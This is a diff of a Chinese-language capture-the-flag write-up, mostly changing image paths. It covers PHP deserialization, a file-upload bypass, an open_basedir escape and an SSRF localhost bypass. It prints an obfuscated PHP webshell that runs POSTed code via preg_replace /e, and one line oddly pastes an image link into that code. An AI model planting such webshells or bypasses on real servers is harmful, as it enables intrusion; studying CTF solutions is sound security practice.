@@ -10,17 +10,15 @@
 
 进入`submit.js`查看源代码，发现了一段代码
 
-![](/assets/import.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import.png)
 
 用python脚本翻译一下十六进制代码，得到
 
-![](/assets/import1.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import1.png)
 
 发现一个目录叫`/fllllaiig`，进去看看
 
-![](/assets/import2.png)
-
-整理代码思路：
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import2.png)
 
 通过get方法传入已经序列化的参数，当参数为常规可反序列化对象时进行反序列化，传入`protected`类型变量`op`，`filename`，`content`和`passwd`，其中`passwd`值需要经过验证，在传入`pop`参数后在析构函数中调用`process`函数进行反序列化以及验证`passwd`操作
 
@@ -28,7 +26,7 @@
 
 第一个点
 
-![](/assets/import4.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import4.png)
 
 加盐md5，已知盐值，而且提示`passwd`都是数字，则尝试用脚本跑出来
 
@@ -51,11 +49,11 @@ data.close()
 
 之后在文件中搜索发现最后的密码为`5201314`
 
-![](/assets/import7.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import7.png)
 
 第二个点：
 
-![](/assets/import8.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import8.png)
 
 析构函数中`op==='2'`为强对比，而前面验证函数中`op=='2'`为弱对比，因而可以通过`op=2`来绕过强对比，避免op被置为'1'从而跳入put分支
 
@@ -90,7 +88,7 @@ echo($exp_s);
 
 远程`file_get_contents(file)`需要用绝对地址
 
-![](/assets/import9.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import9.png)
 
 在构造protected变量的序列化过程中存在\00字符，表现为不可见字符，需要手动添加，位置为环绕\*字符左右各一个，同时s要大写表示后面允许使用\00的表达
 
@@ -108,7 +106,7 @@ $dir='bubblegvm5201314';
 
 进入到`/bubblegvm5201314`目录下查看
 
-![](/assets/import10.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import10.png)
 
 发现是正则表达式检测，通过异或绕过
 
@@ -120,13 +118,13 @@ Payload：
 
 跳转到phpinfo界面，在disable\_function处发现flag：
 
-![](/assets/import11.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import11.png)
 
 ### 0x02 EzUpload
 
 传一个一句话上去，发现过滤.php类型的文件，老规矩传一个jpg上去发现成功了
 
-![](/assets/import12.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import12.png)
 
 上传图片马发现有过滤关键字，尝试多次发现过滤`eval`关键字
 
@@ -135,7 +133,7 @@ Payload：
 Payload：
 
 ```
-<?php 
+![import13](C:\Gitbook\Import\heart1ess_s_ctf\assets\import13.png)<?php 
 $exp = $_POST['shell'];
 @preg_replace('/ad/e','@'.str_rot13('riny').'($exp)', 'add');
 ?>
@@ -143,9 +141,9 @@ $exp = $_POST['shell'];
 
 用burpSuite抓包更改文件后缀从jpg改成php绕过检测
 
-![](/assets/import13.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import13.png)
 
-![](/assets/import14.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import14.png)
 
 用中国蚁剑连接并找到了两个假flag
 
@@ -155,11 +153,11 @@ $exp = $_POST['shell'];
 
 发现了溢出屏幕的`disabled_functions`
 
-![](/assets/import15.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import15.png)
 
 和只有/var、/usr和/tmp的`open_basedir`
 
-![](/assets/import16.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import16.png)
 
 这里可以通过上传php文件然后利用`chdir(‘..’)`指令前往前面目录让目前目录变为根目录最后使用`var_dump(scandir(‘/’)`\)获取目前目录所有文件
 
@@ -178,23 +176,23 @@ var_dump(scandir('/'));
 
 发现`flag.txt`
 
-![](/assets/import17.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import17.png)
 
 然后将`var_dump(scandir(‘/’)`换成`get_file_contents(‘/flag.txt’)`就可以获取flag了
 
-![](/assets/import18.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import18.png)
 
 ### 0x03 rcmd
 
 先进行代码审计
 
-![](/assets/import19.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import19.png)
 
 大致流程为输入一个url然后该网站与url产生连接，传输数据后关闭连接
 
 想让它向本机传输数据，但是url过滤`127.0.0.1`和`localhost`，所以采用进制绕过
 
-![](/assets/import20.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import20.png)
 
 由于连接之后只会发送the content is 和一个整形，我们用`%1$s`覆盖`start`的值让页面输出字符型内容
 
@@ -206,11 +204,11 @@ var_dump(scandir('/'));
 http://api.yoshino-s.online:11455/?url=http://2130706433:5000&start=%1$s
 ```
 
-![](/assets/import21.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import21.png)
 
 进入`/query?=path/fl4g/flag`下查找
 
-![](/assets/import22.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import22.png)
 
 发现文件过滤
 
@@ -295,7 +293,7 @@ Payload：
 
 获得flag
 
-![](/assets/import23.png)
+![](C:\Gitbook\Import\heart1ess_s_ctf\assets\import23.png)
 
 
 
